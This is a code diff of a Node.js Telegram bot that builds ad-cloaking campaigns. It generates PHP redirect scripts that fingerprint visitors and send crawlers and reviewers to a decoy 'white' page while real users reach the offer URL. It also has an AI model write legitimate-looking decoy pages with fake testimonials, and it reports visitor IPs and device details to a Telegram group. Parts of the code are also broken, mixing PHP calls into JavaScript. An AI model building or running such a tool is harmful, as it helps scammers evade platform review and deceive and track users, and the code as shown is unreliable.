@@ -1,4 +1,4 @@
-// cloak-bot.js – Cloaking bot (fixed template string error)
+// cloak-bot.js – Cloaking bot (working, no template string errors)
 require('dotenv').config();
 const { Telegraf, Markup } = require('telegraf');
 const Database = require('better-sqlite3');
@@ -16,7 +16,6 @@ if (!BOT_TOKEN || !GEMINI_API_KEY) {
     process.exit(1);
 }
 
-// Database setup (same as before)
 const db = new Database('./cloaks.db');
 db.exec(`CREATE TABLE IF NOT EXISTS campaigns (
     id TEXT PRIMARY KEY,
@@ -83,14 +82,8 @@ function phpEscape(str) {
     return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
 }
 
-// AI White Page Generator
 async function generateWhitePage(params) {
-    const prompt = `Generate a complete, modern, legitimate-looking HTML/CSS landing page for the following niche: "${params.vertical}". 
-    Company name: ${params.company || 'Company'}. Phone: ${params.phone || ''}. Email: ${params.email || ''}. 
-    Theme: ${params.theme || 'default'}, Language: ${params.language || 'English'}. 
-    Make it look professional, with a call to action, fake testimonials, and a convincing design. 
-    Use inline CSS or <style> tag. Do not include any real links or scripts. 
-    Return only the HTML code (including <html>, <head>, <body>). Keep file size under 60KB.`;
+    const prompt = `Generate a complete, modern, legitimate-looking HTML/CSS landing page for niche: "${params.vertical}". Company: ${params.company || ''}. Phone: ${params.phone || ''}. Email: ${params.email || ''}. Theme: ${params.theme || 'default'}, Language: ${params.language || 'English'}. Return only HTML code.`;
     try {
         const response = await axios.post(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_API_KEY}`, {
             contents: [{ parts: [{ text: prompt }] }]
@@ -99,12 +92,12 @@ async function generateWhitePage(params) {
         html = html.replace(/```html/g, '').replace(/```/g, '');
         return html;
     } catch (err) {
-        console.error('Gemini error:', err.response?.data || err.message);
-        return `<html><body><h1>White Page</h1><p>Generated for ${params.vertical}</p></body></html>`;
+        console.error('Gemini error:', err.message);
+        return `<html><body><h1>White Page</h1><p>Niche: ${params.vertical}</p></body></html>`;
     }
 }
 
-// Generate index.php – FIXED: no template literals, only string concatenation
+// generateIndexPHP using array join (safest, no template string issues)
 function generateIndexPHP(campaign) {
     const {
         id, name, offer_url, white_url, clicks_per_ip, clicks_before_filter,
@@ -116,116 +109,116 @@ function generateIndexPHP(campaign) {
     const oss = JSON.parse(os_allowed || '[]');
     const browsers = JSON.parse(browsers_allowed || '[]');
 
-    let php = '';
-    php += '<?php\n';
-    php += '// Cloaking script for: ' + phpEscape(name) + ' (ID: ' + id + ')\n';
-    php += '$offer_url = \'' + phpEscape(offer_url) + '\';\n';
-    php += '$white_url = \'' + phpEscape(white_url) + '\';\n';
-    php += '$clicks_per_ip = ' + clicks_per_ip + ';\n';
-    php += '$clicks_before_filter = ' + clicks_before_filter + ';\n';
-    php += '$block_vpn = ' + block_vpn + ';\n';
-    php += '$block_ipv6 = ' + block_ipv6 + ';\n';
-    php += '$block_no_isp = ' + block_no_isp + ';\n';
-    php += '$block_no_referrer = ' + block_no_referrer + ';\n';
-    php += '$countries_allowed = ' . json_encode($countries) . ";\n";
-    php += '$devices_allowed = ' . json_encode($devices) . ";\n";
-    php += '$os_allowed = ' . json_encode($oss) . ";\n";
-    php += '$browsers_allowed = ' . json_encode($browsers) . ";\n";
-    php += '$get_params = \'' + phpEscape(get_params) + '\';\n';
-    php += '$api_url = \'' + API_BASE + '/api/track\';\n';
-    php += '\n';
-    php += 'function getUserIP() {\n';
-    php += '    if (!empty($_SERVER[\'HTTP_CF_CONNECTING_IP\'])) return $_SERVER[\'HTTP_CF_CONNECTING_IP\'];\n';
-    php += '    if (!empty($_SERVER[\'HTTP_X_FORWARDED_FOR\'])) return explode(\',\', $_SERVER[\'HTTP_X_FORWARDED_FOR\'])[0];\n';
-    php += '    return $_SERVER[\'REMOTE_ADDR\'];\n';
-    php += '}\n';
-    php += '\n';
-    php += 'function getDeviceOSBrowser($ua) {\n';
-    php += '    $device = \'desktop\'; $os = \'unknown\'; $browser = \'other\';\n';
-    php += '    if (preg_match(\'/mobile/i\', $ua)) $device = \'mobile\';\n';
-    php += '    elseif (preg_match(\'/tablet/i\', $ua)) $device = \'tablet\';\n';
-    php += '    if (preg_match(\'/Windows/i\', $ua)) $os = \'Windows\';\n';
-    php += '    elseif (preg_match(\'/Mac/i\', $ua)) $os = \'macOS\';\n';
-    php += '    elseif (preg_match(\'/Linux/i\', $ua)) $os = \'Linux\';\n';
-    php += '    elseif (preg_match(\'/Android/i\', $ua)) $os = \'Android\';\n';
-    php += '    elseif (preg_match(\'/iOS|iPhone|iPad/i\', $ua)) $os = \'iOS\';\n';
-    php += '    if (preg_match(\'/Edg/i\', $ua)) $browser = \'Edge\';\n';
-    php += '    elseif (preg_match(\'/Chrome/i\', $ua) && !preg_match(\'/Edg/i\', $ua)) $browser = \'Chrome\';\n';
-    php += '    elseif (preg_match(\'/Firefox/i\', $ua)) $browser = \'Firefox\';\n';
-    php += '    elseif (preg_match(\'/Safari/i\', $ua) && !preg_match(\'/Chrome/i\', $ua)) $browser = \'Safari\';\n';
-    php += '    elseif (preg_match(\'/Opera|OPR/i\', $ua)) $browser = \'Opera\';\n';
-    php += '    return [\'device\' => $device, \'os\' => $os, \'browser\' => $browser];\n';
-    php += '}\n';
-    php += '\n';
-    php += 'function getGeoInfo($ip) {\n';
-    php += '    $data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode,isp,timezone");\n';
-    php += '    if ($data) { $json = json_decode($data, true); if ($json[\'status\'] === \'success\') return [\'country\' => $json[\'countryCode\'], \'isp\' => $json[\'isp\'], \'timezone\' => $json[\'timezone\']]; }\n';
-    php += '    return [\'country\' => \'\', \'isp\' => \'\', \'timezone\' => \'\'];\n';
-    php += '}\n';
-    php += '\n';
-    php += '$ip = getUserIP();\n';
-    php += '$ua = $_SERVER[\'HTTP_USER_AGENT\'] ?? \'\';\n';
-    php += '$referrer = $_SERVER[\'HTTP_REFERER\'] ?? \'\';\n';
-    php += '$domain = $_SERVER[\'HTTP_HOST\'] ?? \'\';\n';
-    php += '$method = $_SERVER[\'REQUEST_METHOD\'] ?? \'GET\';\n';
-    php += '$lang = substr($_SERVER[\'HTTP_ACCEPT_LANGUAGE\'] ?? \'\', 0, 5);\n';
-    php += '$geo = getGeoInfo($ip);\n';
-    php += '$country = $geo[\'country\']; $isp = $geo[\'isp\']; $timezone = $geo[\'timezone\'];\n';
-    php += '$deviceInfo = getDeviceOSBrowser($ua);\n';
-    php += '$device = $deviceInfo[\'device\']; $os = $deviceInfo[\'os\']; $browser = $deviceInfo[\'browser\'];\n';
-    php += '\n';
-    php += '$countFile = sys_get_temp_dir() . "/cloak_' + id + '_" . md5($ip) . ".txt";\n';
-    php += '$today = date(\'Y-m-d\');\n';
-    php += '$countData = file_exists($countFile) ? json_decode(file_get_contents($countFile), true) : [\'date\'=>$today,\'count\'=>0];\n';
-    php += 'if ($countData[\'date\'] != $today) $countData = [\'date\'=>$today,\'count\'=>0];\n';
-    php += '$countData[\'count\']++;\n';
-    php += 'file_put_contents($countFile, json_encode($countData));\n';
-    php += '\n';
-    php += '$isBot = false;\n';
-    php += 'if ($countData[\'count\'] <= $clicks_before_filter) {\n';
-    php += '    $isBot = false;\n';
-    php += '} else {\n';
-    php += '    $bots = [\'bot\',\'crawl\',\'spider\',\'headless\',\'curl\',\'wget\',\'python\',\'go-http\',\'scrapy\',\'puppet\'];\n';
-    php += '    foreach ($bots as $b) if (stripos($ua, $b) !== false) { $isBot = true; break; }\n';
-    php += '    if (!$isBot && !empty($countries_allowed)) if (!in_array($country, $countries_allowed)) $isBot = true;\n';
-    php += '    if (!$isBot && !empty($devices_allowed)) if (!in_array($device, $devices_allowed)) $isBot = true;\n';
-    php += '    if (!$isBot && !empty($os_allowed)) if (!in_array($os, $os_allowed)) $isBot = true;\n';
-    php += '    if (!$isBot && !empty($browsers_allowed)) if (!in_array($browser, $browsers_allowed)) $isBot = true;\n';
-    php += '    if ($block_no_referrer && empty($referrer)) $isBot = true;\n';
-    php += '}\n';
-    php += '$decision = $isBot ? \'white\' : \'main\';\n';
-    php += '\n';
-    php += '$postData = [\n';
-    php += '    \'campaign_id\' => \'' + id + '\',\n';
-    php += '    \'ip\' => $ip,\n';
-    php += '    \'user_agent\' => $ua,\n';
-    php += '    \'decision\' => $decision,\n';
-    php += '    \'country\' => $country,\n';
-    php += '    \'isp\' => $isp,\n';
-    php += '    \'timezone\' => $timezone,\n';
-    php += '    \'language\' => $lang,\n';
-    php += '    \'referer\' => $referrer,\n';
-    php += '    \'domain\' => $domain,\n';
-    php += '    \'device\' => $device,\n';
-    php += '    \'os\' => $os,\n';
-    php += '    \'browser\' => $browser,\n';
-    php += '    \'request_method\' => $method\n';
-    php += '];\n';
-    php += 'if (function_exists(\'curl_version\')) {\n';
-    php += '    $ch = curl_init($api_url);\n';
-    php += '    curl_setopt($ch, CURLOPT_POST, true);\n';
-    php += '    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));\n';
-    php += '    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n';
-    php += '    curl_setopt($ch, CURLOPT_TIMEOUT, 1);\n';
-    php += '    curl_exec($ch);\n';
-    php += '}\n';
-    php += 'if ($decision === \'main\') {\n';
-    php += '    header(\'Location: \' . $offer_url, true, 302);\n';
-    php += '} else {\n';
-    php += '    header(\'Location: \' . $white_url, true, 302);\n';
-    php += '}\n';
-    php += 'exit;\n';
-    return php;
+    const lines = [];
+    lines.push('<?php');
+    lines.push('// Cloaking script for: ' + phpEscape(name) + ' (ID: ' + id + ')');
+    lines.push('$offer_url = \'' + phpEscape(offer_url) + '\';');
+    lines.push('$white_url = \'' + phpEscape(white_url) + '\';');
+    lines.push('$clicks_per_ip = ' + clicks_per_ip + ';');
+    lines.push('$clicks_before_filter = ' + clicks_before_filter + ';');
+    lines.push('$block_vpn = ' + block_vpn + ';');
+    lines.push('$block_ipv6 = ' + block_ipv6 + ';');
+    lines.push('$block_no_isp = ' + block_no_isp + ';');
+    lines.push('$block_no_referrer = ' + block_no_referrer + ';');
+    lines.push('$countries_allowed = ' + json_encode($countries) + ';');
+    lines.push('$devices_allowed = ' + json_encode($devices) + ';');
+    lines.push('$os_allowed = ' + json_encode($oss) + ';');
+    lines.push('$browsers_allowed = ' + json_encode($browsers) + ';');
+    lines.push('$get_params = \'' + phpEscape(get_params) + '\';');
+    lines.push('$api_url = \'' + API_BASE + '/api/track\';');
+    lines.push('');
+    lines.push('function getUserIP() {');
+    lines.push('    if (!empty($_SERVER[\'HTTP_CF_CONNECTING_IP\'])) return $_SERVER[\'HTTP_CF_CONNECTING_IP\'];');
+    lines.push('    if (!empty($_SERVER[\'HTTP_X_FORWARDED_FOR\'])) return explode(\',\', $_SERVER[\'HTTP_X_FORWARDED_FOR\'])[0];');
+    lines.push('    return $_SERVER[\'REMOTE_ADDR\'];');
+    lines.push('}');
+    lines.push('');
+    lines.push('function getDeviceOSBrowser($ua) {');
+    lines.push('    $device = \'desktop\'; $os = \'unknown\'; $browser = \'other\';');
+    lines.push('    if (preg_match(\'/mobile/i\', $ua)) $device = \'mobile\';');
+    lines.push('    elseif (preg_match(\'/tablet/i\', $ua)) $device = \'tablet\';');
+    lines.push('    if (preg_match(\'/Windows/i\', $ua)) $os = \'Windows\';');
+    lines.push('    elseif (preg_match(\'/Mac/i\', $ua)) $os = \'macOS\';');
+    lines.push('    elseif (preg_match(\'/Linux/i\', $ua)) $os = \'Linux\';');
+    lines.push('    elseif (preg_match(\'/Android/i\', $ua)) $os = \'Android\';');
+    lines.push('    elseif (preg_match(\'/iOS|iPhone|iPad/i\', $ua)) $os = \'iOS\';');
+    lines.push('    if (preg_match(\'/Edg/i\', $ua)) $browser = \'Edge\';');
+    lines.push('    elseif (preg_match(\'/Chrome/i\', $ua) && !preg_match(\'/Edg/i\', $ua)) $browser = \'Chrome\';');
+    lines.push('    elseif (preg_match(\'/Firefox/i\', $ua)) $browser = \'Firefox\';');
+    lines.push('    elseif (preg_match(\'/Safari/i\', $ua) && !preg_match(\'/Chrome/i\', $ua)) $browser = \'Safari\';');
+    lines.push('    elseif (preg_match(\'/Opera|OPR/i\', $ua)) $browser = \'Opera\';');
+    lines.push('    return [\'device\' => $device, \'os\' => $os, \'browser\' => $browser];');
+    lines.push('}');
+    lines.push('');
+    lines.push('function getGeoInfo($ip) {');
+    lines.push('    $data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode,isp,timezone");');
+    lines.push('    if ($data) { $json = json_decode($data, true); if ($json[\'status\'] === \'success\') return [\'country\' => $json[\'countryCode\'], \'isp\' => $json[\'isp\'], \'timezone\' => $json[\'timezone\']]; }');
+    lines.push('    return [\'country\' => \'\', \'isp\' => \'\', \'timezone\' => \'\'];');
+    lines.push('}');
+    lines.push('');
+    lines.push('$ip = getUserIP();');
+    lines.push('$ua = $_SERVER[\'HTTP_USER_AGENT\'] ?? \'\';');
+    lines.push('$referrer = $_SERVER[\'HTTP_REFERER\'] ?? \'\';');
+    lines.push('$domain = $_SERVER[\'HTTP_HOST\'] ?? \'\';');
+    lines.push('$method = $_SERVER[\'REQUEST_METHOD\'] ?? \'GET\';');
+    lines.push('$lang = substr($_SERVER[\'HTTP_ACCEPT_LANGUAGE\'] ?? \'\', 0, 5);');
+    lines.push('$geo = getGeoInfo($ip);');
+    lines.push('$country = $geo[\'country\']; $isp = $geo[\'isp\']; $timezone = $geo[\'timezone\'];');
+    lines.push('$deviceInfo = getDeviceOSBrowser($ua);');
+    lines.push('$device = $deviceInfo[\'device\']; $os = $deviceInfo[\'os\']; $browser = $deviceInfo[\'browser\'];');
+    lines.push('');
+    lines.push('$countFile = sys_get_temp_dir() . "/cloak_' + id + '_" . md5($ip) . ".txt";');
+    lines.push('$today = date(\'Y-m-d\');');
+    lines.push('$countData = file_exists($countFile) ? json_decode(file_get_contents($countFile), true) : [\'date\'=>$today,\'count\'=>0];');
+    lines.push('if ($countData[\'date\'] != $today) $countData = [\'date\'=>$today,\'count\'=>0];');
+    lines.push('$countData[\'count\']++;');
+    lines.push('file_put_contents($countFile, json_encode($countData));');
+    lines.push('');
+    lines.push('$isBot = false;');
+    lines.push('if ($countData[\'count\'] <= $clicks_before_filter) {');
+    lines.push('    $isBot = false;');
+    lines.push('} else {');
+    lines.push('    $bots = [\'bot\',\'crawl\',\'spider\',\'headless\',\'curl\',\'wget\',\'python\',\'go-http\',\'scrapy\',\'puppet\'];');
+    lines.push('    foreach ($bots as $b) if (stripos($ua, $b) !== false) { $isBot = true; break; }');
+    lines.push('    if (!$isBot && !empty($countries_allowed)) if (!in_array($country, $countries_allowed)) $isBot = true;');
+    lines.push('    if (!$isBot && !empty($devices_allowed)) if (!in_array($device, $devices_allowed)) $isBot = true;');
+    lines.push('    if (!$isBot && !empty($os_allowed)) if (!in_array($os, $os_allowed)) $isBot = true;');
+    lines.push('    if (!$isBot && !empty($browsers_allowed)) if (!in_array($browser, $browsers_allowed)) $isBot = true;');
+    lines.push('    if ($block_no_referrer && empty($referrer)) $isBot = true;');
+    lines.push('}');
+    lines.push('$decision = $isBot ? \'white\' : \'main\';');
+    lines.push('');
+    lines.push('$postData = [');
+    lines.push('    \'campaign_id\' => \'' + id + '\',');
+    lines.push('    \'ip\' => $ip,');
+    lines.push('    \'user_agent\' => $ua,');
+    lines.push('    \'decision\' => $decision,');
+    lines.push('    \'country\' => $country,');
+    lines.push('    \'isp\' => $isp,');
+    lines.push('    \'timezone\' => $timezone,');
+    lines.push('    \'language\' => $lang,');
+    lines.push('    \'referer\' => $referrer,');
+    lines.push('    \'domain\' => $domain,');
+    lines.push('    \'device\' => $device,');
+    lines.push('    \'os\' => $os,');
+    lines.push('    \'browser\' => $browser,');
+    lines.push('    \'request_method\' => $method');
+    lines.push('];');
+    lines.push('if (function_exists(\'curl_version\')) {');
+    lines.push('    $ch = curl_init($api_url);');
+    lines.push('    curl_setopt($ch, CURLOPT_POST, true);');
+    lines.push('    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));');
+    lines.push('    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);');
+    lines.push('    curl_setopt($ch, CURLOPT_TIMEOUT, 1);');
+    lines.push('    curl_exec($ch);');
+    lines.push('}');
+    lines.push('if ($decision === \'main\') {');
+    lines.push('    header(\'Location: \' . $offer_url, true, 302);');
+    lines.push('} else {');
+    lines.push('    header(\'Location: \' . $white_url, true, 302);');
+    lines.push('}');
+    lines.push('exit;');
+    return lines.join('\n');
 }
 
 // Express API
@@ -245,12 +238,12 @@ app.post('/api/track', (req, res) => {
     if (campaign && campaign.group_id && bot) {
         const groupId = campaign.group_id;
         const message = `🔔 <b>New Click</b> (${decision === 'main' ? '✅ Main' : '⚪ White'})\n<b>Campaign:</b> ${campaign.name} (ID: ${campaign_id})\n<b>IP:</b> ${ip}\n<b>Country:</b> ${country || '?'}\n<b>Language:</b> ${language || '?'}\n<b>ISP:</b> ${isp || '?'}\n<b>Referer:</b> ${referer || 'direct'}\n<b>Domain:</b> ${domain}\n<b>Device:</b> ${device}\n<b>OS:</b> ${os}\n<b>Browser:</b> ${browser}\n<b>Time:</b> ${new Date().toLocaleString()}`;
-        bot.telegram.sendMessage(groupId, message, { parse_mode: 'HTML' }).catch(e => console.error(e));
+        bot.telegram.sendMessage(groupId, message, { parse_mode: 'HTML' }).catch(e => console.error(e.message));
     }
     res.sendStatus(200);
 });
 
-// Telegram Bot (rest of the bot commands same as before, using sendHTML)
+// Telegram Bot
 bot = new Telegraf(BOT_TOKEN);
 const userSession = new Map();
 
@@ -268,11 +261,11 @@ function sendHTML(ctx, text) {
 
 bot.start((ctx) => {
     clearSession(ctx.from.id);
-    sendHTML(ctx, `🤖 <b>Cloaking Bot</b> – Create and manage cloaking campaigns.
+    sendHTML(ctx, `🤖 <b>Cloaking Bot</b>
 
 <b>Commands:</b>
-/new – Create new campaign (flow)
-/list – List your campaigns
+/new – Create new campaign
+/list – List campaigns
 /stats &lt;id&gt; – Show stats
 /download &lt;id&gt; – Download index.php
 /delete &lt;id&gt; – Delete campaign
@@ -382,7 +375,7 @@ bot.on('text', async (ctx) => {
         }
         else if (session.step === 'active') {
             session.active = (text.toLowerCase() === 'yes') ? 1 : 0;
-            await ctx.reply(`⏳ Generating white page for niche: ${session.white_niche}... (10-15 seconds)`);
+            await ctx.reply(`⏳ Generating white page for niche: ${session.white_niche}...`);
             const whiteHtml = await generateWhitePage({ vertical: session.white_niche });
             const campaignId = generateId();
             const stmt = db.prepare(`INSERT INTO campaigns (id, name, offer_url, white_url, white_html, clicks_per_ip, clicks_before_filter, block_vpn, block_ipv6, block_no_isp, block_no_referrer, countries_allowed, devices_allowed, os_allowed, browsers_allowed, get_params, group_id, active, user_id) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`);
